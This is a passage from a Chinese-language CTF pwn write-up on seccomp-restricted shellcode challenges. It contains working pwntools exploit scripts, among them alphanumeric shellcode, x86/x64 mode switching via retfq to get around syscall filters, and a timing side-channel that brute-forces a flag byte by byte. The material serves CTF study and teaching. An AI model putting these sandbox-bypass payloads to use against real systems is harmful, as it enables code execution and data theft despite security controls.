rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*read(0, 0x40404040, 0x70)*/</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;mmap_read&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(asm(shellcode_mmap_read_call, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rbx --input=&quot;mmap_read&quot;</span><br></pre></td></tr></table></figure>

<p>生成之后的shellcode是这样的：</p>
<p><code>Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2E0r150p020n1o0N2N0Z050j2C104o1M1O3k2D2r130Z7l0h0e072k108O1l2O0q2m0q2q0Y7K0h2l134r7n068O4L07</code></p>
<blockquote>
<p>也可以手写shellcode，毕竟这道题对于shellcode的字符要求还不是很严格，参考以下的文章：</p>
<p>[(11条消息) 2021 强网杯 <a href="https://blog.csdn.net/yongbaoii/article/details/118067019">强网先锋] shellcode_yongbaoii的博客-CSDN博客</a></p>
<p><a href="https://n0va-scy.github.io/2022/02/14/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/">shellcode 的艺术 | R4bb1t的ctf博客 (n0va-scy.github.io)</a></p>
</blockquote>
<h3 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">pld = <span class="string">&#x27;&#x27;&#x27;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2E0r150p020n1o0N2N0Z050j2C104o1M1O3k2D2r130Z7l0h0e072k108O1l2O0q2m0q2q0Y7K0h2l134r7n068O4L07&#x27;&#x27;&#x27;</span></span><br><span class="line">sh.recv()</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x4002eb\nc\n&#x27;)</span></span><br><span class="line">s(pld)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">shellcode_to_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404050</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esp, 0x40404200</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_to_x64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x40404078</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 0x40404100</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, 0x40404100</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = asm(shellcode_to_x86)</span><br><span class="line">pld = pld.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">pld += asm(shellcode_open)</span><br><span class="line">pld += asm(shellcode_to_x64)</span><br><span class="line">pld = pld.ljust(<span class="number">0x38</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">pld += asm(shellcode_read)</span><br><span class="line">pld += asm(shellcode_write)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="WP-again-1"><a href="#WP-again-1" class="headerlink" title="WP_again"></a>WP_again</h3><blockquote>
<p>网上师傅的手写shellcode脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode: &quot;</span>)</span><br><span class="line"></span><br><span class="line">append_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ecx,eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x40404089</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*write(1,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_x86 = asm(shellcode_x86)</span><br><span class="line">shellcode_flag = asm(shellcode_flag,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40404040为32位shellcode地址</span></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax /*set r9*/</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*syscall*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(0, 0x40404040, 0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x57],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x58],cl</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode += shellcode_mmap</span><br><span class="line">shellcode += append</span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += append</span><br><span class="line"></span><br><span class="line">shellcode += shellcode_retfq</span><br><span class="line">shellcode += append</span><br><span class="line">shellcode = asm(shellcode,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode_x86 + <span class="number">0x29</span>*<span class="string">b&#x27;\x90&#x27;</span> + shellcode_flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="侧信道攻击-不允许write"><a href="#侧信道攻击-不允许write" class="headerlink" title="侧信道攻击(不允许write)"></a>侧信道攻击(不允许write)</h2><p>了解何为侧信道攻击？当题目开启了沙盒禁用了<code>execv</code>系统调用，那我们可以通过<code>owr</code>来进行攻击获取<code>flag</code>，但是当我们能够使用的系统调用更少了，比如我们只有<code>open</code>和<code>read</code>可用，或者是程序<code>close(1)</code>关闭了输出流，那我们怎么攻击呢？我们只能对<code>flag</code>进行逐位爆破。</p>
<p>如何实现爆破呢？我们通常会将<code>flag</code>读写到一段内存空间，然后用猜测的方法将我们每次输入的数据和<code>flag</code>的每一位进行比较，如果比较成功了，那么程序将进入死循环（<strong>我们可以通过<code>time</code>这个模块来获取时间戳的差值</strong>），比如时间超过1秒那么我们对于<code>flag</code>的一个字节就爆破成功，同时配上<code>python</code>中的<code>try</code>和<code>except</code>这两个关键字就可以实现逐位的爆破。一般这种攻击一般采用<code>shellcode</code>来攻击，基于二分法的攻击将更为简便。</p>
<h3 id="题目流程-2"><a href="#题目流程-2" class="headerlink" title="题目流程"></a>题目流程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int128 v4; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v5; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v6; <span class="comment">// xmm2</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-68h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+50h] [rbp-60h]</span></span><br><span class="line">  __int128 buf; <span class="comment">// [rsp+60h] [rbp-50h] BYREF</span></span><br><span class="line">  __int128 v11; <span class="comment">// [rsp+70h] [rbp-40h]</span></span><br><span class="line">  __int128 v12; <span class="comment">// [rsp+80h] [rbp-30h]</span></span><br><span class="line">  __int128 v13; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+A0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_A60(a1, a2, a3);</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to silent execution-box.&quot;</span>);</span><br><span class="line">  v3 = getpagesize();</span><br><span class="line">  v9 = (<span class="type">int</span>)mmap((<span class="type">void</span> *)<span class="number">0x1000</span>, v3, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v8 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v8, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v8, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v8);</span><br><span class="line">  v4 = buf;</span><br><span class="line">  v5 = v11;</span><br><span class="line">  v6 = v12;</span><br><span class="line">  *(_OWORD *)(v9 + <span class="number">48</span>) = v13;</span><br><span class="line">  *(_OWORD *)(v9 + <span class="number">32</span>) = v6;</span><br><span class="line">  *(_OWORD *)(v9 + <span class="number">16</span>) = v5;</span><br><span class="line">  *(_OWORD *)v9 = v4;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64, __int64))v9)(<span class="number">3735928559LL</span>, <span class="number">3735928559LL</span>, <span class="number">3735928559LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zyy@zyy-virtual-machine:~/桌面/lm/silent$ seccomp-tools dump ./silent</span><br><span class="line">Welcome to silent execution-box.</span><br><span class="line">aaa</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>这里我们看到开辟了一块起始地址是<code>0x1000</code>的映射段，并且会将我们写入的数据存入该映射段中，最后执行我们所写的内容，这里由于<code>0x40</code>小于<code>16*8</code>，所以不用担心程序修改我们的<code>shellcode</code>。</p>
<h3 id="恶补一下汇编-判断与跳转"><a href="#恶补一下汇编-判断与跳转" class="headerlink" title="恶补一下汇编(判断与跳转)"></a>恶补一下汇编(判断与跳转)</h3><h3 id="判断指令"><a href="#判断指令" class="headerlink" title="判断指令"></a>判断指令</h3><p><code>cmp</code>指令：<code>cmp &lt;arg1&gt; : &lt;arg2&gt;</code></p>
<p>计算<code>&lt;arg1&gt; - &lt;arg2&gt;</code>的结果但是不保存，仅仅对标志位进行设置，有以下几种情况：</p>
<ul>
<li><code>arg1 = arg2</code>：<code>zf = 1</code></li>
<li><code>arg1 != arg2</code>：<code>zf = 0</code></li>
<li><code>arg1 &gt;= arg2</code>：<code>cf = 0</code></li>
<li><code>arg1 &gt; arg2</code>：<code>cf = 0</code>且<code>zf = 0</code></li>
<li><code>arg1 &lt;= arg2</code>：<code>cf = 1</code>且<code>zf = 1</code></li>
</ul>
<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ol>
<li>基于特定的标志位<ul>
<li><code>jz</code>：为零跳转，<code>zf = 1</code></li>
<li><code>jnz</code>：非零跳转，<code>zf = 0</code></li>
<li><code>jc</code>：进位跳转，<code>cf = 1</code></li>
<li><code>jnc</code>：无进位跳转，<code>cf = 0</code></li>
</ul>
</li>
<li>基于相等性的跳转<ul>
<li><code>je</code>：相等跳转，<code>zf = 1</code></li>
<li><code>jne</code>：不相等跳转，<code>zf = 0</code></li>
</ul>
</li>
<li>基于无符号数比较的跳转<ul>
<li><code>ja</code>：大于跳转，<code>cf = 0</code>且<code>zf = 0</code></li>
<li><code>jna</code>：不大于跳转，<code>cf = 1</code>且<code>zf = 1</code></li>
<li><code>jb</code>：小于跳转，<code>cf = 1</code></li>
<li><code>jnb</code>：不小于跳转，<code>cf = 0</code></li>
</ul>
</li>
</ol>
<h3 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sd = <span class="keyword">lambda</span> data : sh.sendline(data)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>,<span class="number">17</span>):   <span class="comment"># range(0,8) range(8,16) range(16,17)</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        sh = process(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Welcome to silent execution-box.\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 如果没有收取&#x27;\n&#x27;，那么下面就需要再次recv来收取垃圾数据</span></span><br><span class="line">        shellcode = shellcraft.amd64.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">        shellcode += shellcraft.amd64.linux.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">17</span>)</span><br><span class="line">        <span class="comment"># 进行逐个字节的比较</span></span><br><span class="line">        shellcode += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">        cmp byte ptr[rsp+&#123;0&#125;], &#123;1&#125;</span></span><br><span class="line"><span class="string">        je loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(i, ch)</span><br><span class="line">        payload = asm(shellcode)</span><br><span class="line">        <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">        sd(payload)</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        </span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># sh.recv()		# 收取垃圾数据</span></span><br><span class="line">            sh.recv(timeout = <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">1.5</span>:</span><br><span class="line">            ans = ans + <span class="built_in">chr</span>(ch)</span><br><span class="line">            success(<span class="string">&quot;\033[0;32mflag:&#123;0&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(ans))</span><br><span class="line">            sh.close()</span><br><span class="line">            sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，如果我们<code>open</code>的文件过多，系统会发生错误：<code>OSError: [Errno 24] Too many open files</code>，所以我们每次爆破的flag的字节数有限制，需要对索引进行调整，这也是这个脚本的缺陷所在。</p>
<h3 id="WP-again-2"><a href="#WP-again-2" class="headerlink" title="WP_again"></a>WP_again</h3><blockquote>
<p>学长的自动化脚本，膜拜一下</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamite_xor</span>(<span class="params">io,idx,char</span>):</span><br><span class="line">    shellcode = shellcraft.amd64.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,idx+<span class="number">1</span>)</span><br><span class="line">    shellcode += <span class="string">&quot;mov al,[rsp+&#123;0&#125;];xor rax,&#123;1&#125;;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx),<span class="built_in">str</span>(char))</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Welcome to silent execution-box.&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;\033[0;34mmov al,[rsp+&#123;0&#125;]; xor rax, &#123;1&#125;;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx),<span class="built_in">chr</span>(char)))</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamite_sub</span>(<span class="params">io,idx,char</span>):</span><br><span class="line">    shellcode = shellcraft.amd64.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,idx+<span class="number">1</span>)</span><br><span class="line">    shellcode += <span class="string">&quot;mov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx),<span class="built_in">str</span>(char))</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Welcome to silent execution-box.&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;\033[0;34mmov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx),<span class="built_in">chr</span>(char)))</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamite_add</span>(<span class="params">io,idx,char</span>):</span><br><span class="line">    shellcode = shellcraft.amd64.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.<span 